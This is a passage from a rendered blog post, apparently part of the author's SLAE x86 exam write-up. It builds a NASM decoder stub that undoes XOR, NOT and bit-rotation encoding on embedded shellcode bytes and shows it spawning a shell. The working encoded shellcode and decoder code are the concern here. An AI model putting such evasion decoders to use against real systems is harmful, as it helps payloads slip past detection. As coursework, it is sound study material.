+    <span class="nf">mul</span> <span class="nb">ebx</span>
+
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">CallShellcode</span>
+
+<span class="nl">Shellcode:</span>
+
+    <span class="nf">pop</span> <span class="nb">esi</span>
+
+<span class="nl">Decode:</span>
+
+    <span class="c1">; ...</span>
+
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Decode</span>
+
+<span class="nl">CallShellcode:</span>
+
+    <span class="nf">call</span> <span class="nv">Shellcode</span>
+    <span class="nl">encoded:</span> <span class="kd">db</span> <span class="mh">0x2</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xf5</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xeb</span>
+</code></pre></div></div>
+<p>As you can see, it is based on the famous <code>JMP-CALL-POP</code> technique in order to get a reference to the shellcode. I chose to use this because the other one I knew (pushing groups of <code>4</code> bytes on the stack) would increase the size of the shellcode.</p>
+<p>Anyways, now the routine <code>Decode</code> must be implemented to decode the encoded shellcode. As mentioned previously, the first decoding operation is the following:</p>
+<blockquote>
+<ol>
+<li><code>XOR</code> each byte with the value of <code>shellcode_length_least_byte</code>, made exception for bytes equal to it</li>
+</ol>
+</blockquote>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">_start:</span>
+    <span class="c1">; clear some registers for later use</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+    <span class="nf">mul</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
+
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">CallShellcode</span>
+
+<span class="nl">Shellcode:</span>
+
+    <span class="c1">; get a reference to the encoded shellcode</span>
+    <span class="nf">pop</span> <span class="nb">esi</span>
+
+    <span class="c1">; copy the address of the first encoded assembly instruction into EBX</span>
+    <span class="c1">;   +4 -&gt; skip the first 4 auxiliary bytes </span>
+    <span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+
+    <span class="c1">; copy ROT_EVEN and ROT_ODD into AX</span>
+    <span class="c1">;   AL: ROT_EVEN</span>
+    <span class="c1">;   AH: ROT_ODD</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="kt">WORD</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
+
+    <span class="c1">; copy the XOR-ed length of the shellcode into CX</span>
+    <span class="c1">;   and XOR it again with ROT_EVEN:ROT_ODD to decode it</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span> <span class="kt">WORD</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+    <span class="nf">xor</span> <span class="nb">cx</span><span class="p">,</span> <span class="nb">ax</span>
+
+    <span class="c1">; copy the length of the shellcode on the stack, for later use</span>
+    <span class="nf">push</span> <span class="nb">ecx</span>
+</code></pre></div></div>
+<p><sub class='aside'>Prepare registers before actually jumping to the <code>Decode</code> routine
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Decode:</span>
+
+    <span class="c1">; copy the length of the shellcode (previous 'push ecx') into DL</span>
+    <span class="c1">; and check if the two bytes are the same</span>
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
+    <span class="nf">cmp</span> <span class="nb">dl</span><span class="p">,</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>
+
+    <span class="c1">; if they are equal jump to the next decoding operation: NOT</span>
+    <span class="nf">je</span> <span class="nv">NotDecode</span>
+
+    <span class="c1">; if they aren't the equal, then XOR the byte with 'shellcode_length_least_byte'</span>
+    <span class="c1">;   which is the length of the shellcode XOR-ed with ROT_EVEN</span>
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+    <span class="nf">xor</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">],</span> <span class="nb">dl</span>
+</code></pre></div></div>
+<p><sub class='aside'>Perform the 1st Decoding operation (<code>XOR</code>) or move to the next one, based on the commented condition
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">CallShellcode:</span>
+
+    <span class="nf">call</span> <span class="nv">Shellcode</span>
+    <span class="nl">encoded:</span> <span class="kd">db</span> <span class="mh">0x2</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xf5</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xeb</span>
+</code></pre></div></div>
+<p>Now that the 1st operation is done, it's time to move to the 2nd one:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Decode:</span>
+
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
+    <span class="nf">cmp</span> <span class="nb">dl</span><span class="p">,</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>
+    <span class="nf">je</span> <span class="nv">NotDecode</span>
+
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+    <span class="nf">xor</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">],</span> <span class="nb">dl</span>
+
+<span class="nl">NotDecode:</span>
+
+    <span class="nf">not</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>
+</code></pre></div></div>
+<p>This one is very straightforward: based on the Decode routine I've already shown, if the current byte and the one known as <code>shellcode_length_least_byte</code> are equal, it jumps to <code>NoteDecode</code> in order to perform the <code>NOT</code> operation.</p>
+<p>After that, the shellcode has to perform the 3d decoding operation:</p>
+<blockquote>
+<p>3. Rotate bytes</p>
+<ul>
+<li>if the index of the byte is <code>even</code>, then rotate to the left (<code>ROL</code>) <code>ROT_EVEN</code> times</li>
+<li>if the index of the byte is <code>odd</code>, then rotate to the right (<code>ROR</code>) <code>ROT_ODD</code> times</li>
+</ul>
+</blockquote>
+<p>Follows the assembly code of interest:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">RotateBytes:</span>
+
+    <span class="c1">; save EBX before overwriting it</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+
+    <span class="c1">; check if the index is EVEN or ODD</span>
+    <span class="c1">; Math logic:</span>
+    <span class="c1">;   - EBX - ESI = 4 + current_byte_index</span>
+    <span class="c1">;   - if the Least Significant Bit is 1, then it is ODD</span>
+    <span class="c1">;   - use test to set the ZF flag if the index is ODD</span>
+    <span class="nf">sub</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>
+    <span class="nf">test</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>
+
+    <span class="c1">; restore EBX and load the byte into DL</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">]</span>
+
+    <span class="c1">; if the ZF flag is set, the index is ODD</span>
+    <span class="nf">jnz</span> <span class="nv">RotateOdd</span>
+</code></pre></div></div>
+<p><sub class='aside'>The shellcode checks if the index of the current byte is <code>ODD</code>/<code>EVEN</code>, then sets the <code>ZF</code> flag accordingly
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">RotateEven:</span>
+
+    <span class="c1">; Rotate the byte ROT_EVEN times</span>
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="nb">al</span>
+    <span class="nf">rol</span> <span class="nb">dl</span><span class="p">,</span> <span class="nb">cl</span>
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">AfterRotateByte</span>
+
+<span class="nl">RotateOdd:</span>
+
+    <span class="c1">; rotate the byte ROT_ODD times</span>
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="nb">ah</span>
+    <span class="nf">ror</span> <span class="nb">dl</span><span class="p">,</span> <span class="nb">cl</span>
+</code></pre></div></div>
+<p><sub class='aside'>I wrote two different assembly routines, one to decode <strong>even-indexed</strong> bytes, and the other one to decode <strong>odd-indexed</strong> bytes
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">AfterRotateByte:</span>
+
+    <span class="c1">; replace the original rotated byte with the decoded one</span>
+    <span class="nf">mov</span> <span class="kt">BYTE</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">],</span> <span class="nb">dl</span>
+
+    <span class="c1">; decrease the loop counter (size of the shellcode)</span>
+    <span class="nf">dec</span> <span class="kt">WORD</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
+
+    <span class="c1">; if the loop counter reaches 0, then jump to the decoded shellcode, skipping the auxiliary bytes</span>
+    <span class="nf">jz</span> <span class="nv">encoded</span><span class="o">+</span><span class="mi">4</span>
+
+    <span class="c1">; increase the offset of the next byte to be decoded, and jump to decode it</span>
+    <span class="nf">inc</span> <span class="nb">ebx</span>
+    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Decode</span>
+</code></pre></div></div>
+<p>The full program can be found <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm">here</a>.</p>
+<p>I used the following commandsd to confirm it works correctly:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~<span class="nv">$ </span>vim decoder.nasm
+rbct@slae:~<span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 decoder.nasm
+rbct@slae:~<span class="nv">$ </span>ld <span class="nt">-N</span> <span class="nt">-o</span> decoder decoder.o
+rbct@slae:~<span class="nv">$ </span>./decoder
+<span class="nv">$ </span><span class="nb">whoami</span>
+<span class="c"># rbct</span>
+<span class="nv">$ </span><span class="nb">id</span> 
+<span class="c"># uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span>
+<span class="nv">$ </span><span class="nb">exit
+</span>rbct@slae:~<span class="err">$</span>
+</code></pre></div></div>
+<p>Among the drawbacks of this approach, the length of the decoder stub is quite apparent.</p>
+<p>Considering the length of the original shellcode is <code>28</code> bytes, and the length of the full shellcode is <code>106</code> bytes, that means the decode stub uses <code>78</code> bytes, which is like <code>3x</code> times the length of the original shellcode.</p>
+<p>Although it may not be optimal for small shelcode, it can be useful for bigger shellcode.</p>
+
+
+            <footer class="tags">
+                <section class="mono tags">
+                    Tagged
+
+                    
+                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/x86/">x86</a>, <a href="/tags#/tags/python/">python</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/encoding/">encoding</a>, <a href="/tags#/tags/decoding/">decoding</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>
+                </section><section class="pagination">
+                        <a href="/21/12/25/slae32-assignment-5_1">
+                            <div class="mono">NEXT</div>
+                            SLAE x86 Exam - Assignment #5 Part 1
+                        </a>
+                    </section><section class="pagination">
+                        <a href="/21/12/21/slae32-assignment-3">
+                            <div class="mono">PREVIOUS</div>
+                            SLAE x86 Exam - Assignment #3
+                        </a>
+                    </section></footer>
+        </main>
+    </article>
+  </body>
+</html>
